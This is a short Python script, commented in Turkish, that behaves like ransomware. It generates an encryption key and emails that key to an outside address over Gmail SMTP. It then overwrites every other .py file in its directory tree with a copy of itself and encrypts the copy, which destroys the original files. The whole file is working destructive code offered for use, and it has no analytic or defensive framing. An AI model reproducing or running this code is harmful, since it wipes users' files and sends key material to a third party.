import os
import shutil
import smtplib
import getpass
import cryptography.fernet as fernet

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    cipher = fernet.Fernet(key)
    encrypted_data = cipher.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def send_email(sender_email, sender_password, receiver_email, subject, message):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        email_body = f"Subject: {subject}\n\n{message}"
        server.sendmail(sender_email, receiver_email, email_body)
        server.quit()
        print("E-posta başarıyla gönderildi!")
    except Exception as e:
        print("E-posta gönderilirken bir hata oluştu:", str(e))

def copy_self_to_all_files():
    current_file = os.path.abspath(__file__)
    current_dir = os.path.dirname(current_file)
    key = fernet.Fernet.generate_key()
    key_string = key.decode()

    sender_email = "your_email@gmail.com"  # Gönderici e-posta adresi
    sender_password = getpass.getpass("Gönderici e-posta şifresi: ")
    receiver_email = "recipient_email@gmail.com"  # Alıcı e-posta adresi
    subject = "Encryption Key"  # E-posta konusu
    message = f"Şifreleme Anahtarı:\n\n{key_string}"  # E-posta içeriği

    send_email(sender_email, sender_password, receiver_email, subject, message)

    for root, dirs, files in os.walk(current_dir):
        for file in files:
            if file.endswith(".py") and file != os.path.basename(current_file):
                destination = os.path.join(root, file)
                shutil.copyfile(current_file, destination)
                encrypt_file(destination, key)

if __name__ == "__main__":
    copy_self_to_all_files()
